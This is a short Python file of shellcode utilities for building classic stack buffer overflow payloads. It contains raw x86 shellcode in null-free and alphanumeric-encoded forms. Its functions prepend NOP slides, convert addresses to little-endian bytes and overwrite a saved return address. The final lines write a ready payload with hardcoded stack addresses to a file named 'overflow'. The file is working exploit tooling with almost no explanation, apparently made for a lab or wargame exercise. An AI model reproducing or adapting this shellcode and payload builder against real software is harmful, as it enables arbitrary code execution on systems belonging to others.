#
# Shellcode utilities
#


nop = b"\x90"
no_zero_sc = b"\xd9\xc5\xd9\x74\x24\xf4\x5b\xba\xec\xb1\xbf\x50\x2b\xc9" + \
b"\xb1\x0b\x31\x53\x18\x83\xeb\xfc\x03\x53\xf8\x53\x4a\x3a" + \
b"\x0b\xcc\x2c\xe9\x6d\x84\x63\x6d\xf8\xb3\x14\x5e\x89\x53" + \
b"\xe5\xc8\x42\xc6\x8c\x66\x15\xe5\x1d\x9f\x23\xea\xa1\x5f" + \
b"\x58\x82\x81\x72\xee\x52\x95\xdf\x87\xb2\xd4\x60"

ascii_sc = "IIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJ" + \
"IKLBJJKPMM8KIKOKOKOE0LKBLFDFDLKPEGLLKCLC5D8C1JOLKPOEHLKQOGPEQ" + \
"JKPILKGDLKEQJNFQIPMINLLDIPCDC7IQHJDMC1HBJKJTGKF4GTFHBUJELKQOG" + \
"TC1JKCVLKDLPKLKQOELEQJKESFLLKLIBLFDELE1HCP1IKE4LKG3FPLKG0DLLK" + \
"BPELNMLKG0DHQNE8LNPNDNJLPPKOHVE6QCE6CXP3FRE8CGCCP2QOPTKON0CXH" + \
"KJMKLGKF0KOHVQOMYM5E6K1JMEXC2PUBJDBKON0CXN9C9KENMPWKON6QCF3F3" + \
"F3PSG3PSPCQCKOHPBFE8DQQLBFPSMYKQMECXNDDZBPIWQGKOHVBJB0PQPUKOH" + \
"PBHNDNMFNKYPWKON6QCF5KOHPCXKUG9K6QYQGKOHVF0QDF4QEKON0MCCXKWD9" + \
"HFBYQGKOIFQEKON0BFCZBDE6CXCSBMMYJECZF0F9FIHLK9KWCZQTK9JBFQIPK" + \
"CNJKNQRFMKNG2FLMCLMBZFXNKNKNKCXCBKNNSB6KOD5QTKON6QKF7QBF1PQF1" + \
"BJC1F1F1PUPQKON0CXNMIIDEHNQCKOHVBJKOKOGGKOHPLKF7KLLCITBDKON6Q" + \
"BKOHPE8L0MZETQOQCKOHVKOHPEZAA"



def address_to_string(addr):
  addr_tmp = addr.replace("0x", "")
  acc = ""
  while len(addr_tmp) > 1:
    acc += chr(int(addr_tmp[0:2], 16))
    addr_tmp = addr_tmp[2:]
  return acc

def string_to_address(s, reversed=True):
  # Convert a string like 0xbffffc4a into \x4a\xfc\xff\xbf
  s_tmp = s.replace("0x", "")
  acc = []
  while len(s_tmp) > 1:
    acc.append(int(s_tmp[0:2], 16))
    s_tmp = s_tmp[2:]
  if reversed:
    return bytes(acc[::-1])
  else:
    return bytes(acc)

def shellcode(nopslide=100):
  return nop * nopslide + no_zero_sc

def overflow(initial_length, address, tail_length, reversed=True):
  if initial_length > len(no_zero_sc):
    init = no_zero_sc + nop * (initial_length - len(no_zero_sc))
    tail = nop * tail_length
  else:
    init = nop * initial_length
    tail = no_zero_sc  + nop * (tail_length - len(no_zero_sc))
  addr = string_to_address(address, reversed)
  return init + addr + tail

def stack_overflow(insert_addr, target_addr, after_target=False, reversed=True):
  # Essentially, insert_addr is the starting addr of our
  # variable, and target_addr is the return addr to be
  # overwritten.
  # The flow will be redirected to insert_addr or target_addr + 0x4
  # if after_target is set.
  init_length = int(target_addr, 16) - int(insert_addr, 16)
  if after_target:
    addr = hex(int(target_addr, 16) + 4)
  else:
    addr = insert_addr
  tail_length = 0
  return overflow(init_length, addr, tail_length, reversed)


with open("overflow", "wb") as f:
  f.write(stack_overflow("0xbffff4bc", "0xbffff65c", reversed=True))
